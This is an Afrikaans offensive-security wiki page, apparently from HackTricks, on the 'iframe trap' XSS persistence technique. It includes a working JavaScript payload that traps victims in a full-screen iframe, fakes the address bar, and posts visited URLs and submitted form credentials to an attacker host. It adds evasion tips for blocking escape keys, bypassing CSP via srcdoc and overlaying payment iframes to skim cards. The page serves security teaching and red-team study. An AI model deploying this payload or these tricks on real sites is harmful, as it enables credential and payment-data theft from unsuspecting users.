# Iframe Valstrikke

{{#include ../banners/hacktricks-training.md}}

## Basiese Inligting

Hierdie vorm van misbruik van XSS via iframes om inligting te steel vanaf die gebruiker wat oor die webblad skuif, is oorspronklik gepubliseer in hierdie 2 plasings van trustedsec.com: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **en** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

Die aanval begin op 'n bladsy wat kwesbaar is vir 'n XSS waar dit moontlik is om te sorg dat die **slagoffers die XSS nie verlaat nie** deur hulle te laat **navigeer binne 'n iframe** wat die hele webtoepassing inneem.

Die XSS-aanval laai basies die webblad in 'n iframe wat 100% van die skerm beslaan. Daarom sal die slagoffer **nie merk dat hy in 'n iframe is nie**. As die slagoffer dan op die bladsy navigeer deur skakels binne die iframe te klik (binne die web), sal hy **binne die iframe navigeer** met die willekeurige JS wat gelaai is en inligting van hierdie navigasie steel.

Verder, om dit meer realisties te maak, is dit moontlik om sekere **listeners** te gebruik om te kontroleer wanneer 'n iframe die ligging van die bladsy verander, en die URL van die blaaier by te werk met daardie lokasies sodat die gebruiker dink hy blaai tussen bladsye deur die blaaier te gebruik.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

Verder is dit moontlik om listeners te gebruik om sensitiewe inligting te steel, nie net die ander bladsye wat die slagoffer besoek nie, maar ook die data wat gebruik word om **vorms in te vul** en dit te stuur (credentials?) of om die **local storage** te steel...

Natuurlik is die hoofbeperkings dat 'n **slagoffer wat die oortjie sluit of 'n ander URL in die blaaier tik die iframe sal ontsnap**. 'n Ander manier om dit te doen is deur die bladsy te **refresh**, maar dit kan gedeeltelik **voorkom** word deur die regsklik-konteksmenu te deaktiveer elke keer as 'n nuwe bladsy binne die iframe gelaai word of deur op te let wanneer die muis van die gebruiker die iframe verlaat, moontlik om die herlaai-knoppie van die blaaier te klik — in daardie geval word die URL van die blaaier bygewerk met die oorspronklike URL wat kwesbaar is vir XSS sodat as die gebruiker dit herlaai, dit weer besmet sal word (let wel: dit is nie baie stealth nie).

## Gemoderniseerde valstrik (2024+)

* Gebruik 'n **full‑viewport iframe** plus History/Navigation API om werklike navigasie na te boots.

<details>
<summary>Full-viewport iframe valstrik</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) hou die buitenste URL‑balk in sinchronisasie sonder leaking van die regte URL.
* Gaan **volskerm** om die blaaier‑UI te verberg en teken jou eie valse adresbalk/slotsimbool.

## Overlay & skimmer gebruik

* Compromitteerde merchants vervang gehoste payment iframes (Stripe, Adyen, etc.) met 'n **pixel‑perfekte overlay** wat toetse stuur terwyl die werklike frame onderbly, soms met legacy validation APIs sodat die vloei nooit breek nie.
* Vasvang van gebruikers in die top frame kap **autofill/password‑manager** data voordat hulle opmerk dat die URL‑balk nooit verander het nie.

## Evasie‑truuks waargeneem in 2025 navorsing

* `about:blank`/`data:` lokale frames erf die parent origin en omseil sommige content‑blocker heuristieke; geneste iframes kan herleef selfs wanneer extensions third‑party frames afbreek.
* **Permissie‑propagasie**: herskryf van die parent `allow` attribute gee geneste attacker frames fullscreen/camera/microphone sonder sigbare DOM‑veranderings.

## Vinnige OPSEC wenke

* Herfokus die iframe wanneer die muis verlaat (`mouseleave` op body) om te keer dat gebruikers die blaaier‑UI bereik.
* Deaktiveer context menu en algemene sneltoetse (`keydown` vir `F11`, `Ctrl+L`, `Ctrl+T`) binne die frame om ontsnappingspogings te vertraag.
* As CSP inline scripts blokkeer, injekteer 'n remote bootstrapper en skakel `srcdoc` op die iframe aan sodat jou payload buite die afgedwonge CSP van die hoofblad woon.

## Related

{{#ref}}
clickjacking.md
{{#endref}}



## References

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
